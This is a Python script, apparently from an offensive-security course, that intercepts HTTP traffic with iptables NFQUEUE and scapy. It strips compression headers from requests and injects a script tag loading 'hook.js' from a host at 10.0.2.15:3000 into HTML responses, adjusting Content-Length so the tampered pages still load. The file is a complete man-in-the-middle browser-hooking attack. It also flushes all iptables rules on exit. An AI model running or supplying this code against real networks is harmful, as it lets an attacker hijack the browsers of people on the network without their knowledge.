#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import subprocess
import argparse
import re

http_ports = [80, 8080, 8008, 8000]

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-c0", "--chain0", dest="chain_name0", help="Chain name: FORWARD, OUTPUT, INPUT etc.")
    parser.add_argument("-c1", "--chain1", dest="chain_name1", help="Chain name: FORWARD, OUTPUT, INPUT etc.")
    parser.add_argument("-qn", "--queue-num", dest="queue_num", help="Queue number: 0, 1, 3 etc.")
    options = parser.parse_args()
    if not options.chain_name0:
        parser.error("Please, specify a chain name, use --help for more info")
    elif not options.queue_num:
        parser.error("Please, specify a queue number, use --help for more info")
    else:
        if ("OUTPUT" or "INPUT") == options.chain_name0:
            if not options.chain_name1:
                parser.error("Please, specify a chain name, use --help for more info")
    return options

def presets_for_intercept_and_modify_packets(options):
    if options.chain_name1:
        subprocess.call(["iptables", "-I", options.chain_name1, "-j", "NFQUEUE", "--queue-num", options.queue_num])
    subprocess.call(["iptables", "-I", options.chain_name0, "-j", "NFQUEUE", "--queue-num", options.queue_num])

def flush_presets():
    subprocess.call("iptables --flush", shell=True)

def set_load_data(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport in http_ports:
            print("Request")
            # print(scapy_packet.show())
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

        elif scapy_packet[scapy.TCP].sport in http_ports:
            print("Response")
            # print(scapy_packet.show())
            injection_code = "<script src='http://10.0.2.15:3000/hook.js'></script>"
            load = load.replace("</head>", injection_code + "</head>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                content_length_header = "Content-Length: "
                load = load.replace(content_length_header + content_length, content_length_header + str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load_data(scapy_packet, load)
            packet.set_payload(str(new_packet))
    packet.accept()

options = get_args()
presets_for_intercept_and_modify_packets(options)
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(int(options.queue_num), process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\nDetecting 'CTRL+C'... Flushing IP-tables... Please wait...")
    flush_presets()
    print("IP-tables were flushing successfully!")
except BaseException:
    print("WARNING! Something get wrong!")
    flush_presets()
    print("IP-tables were flushing successfully!")
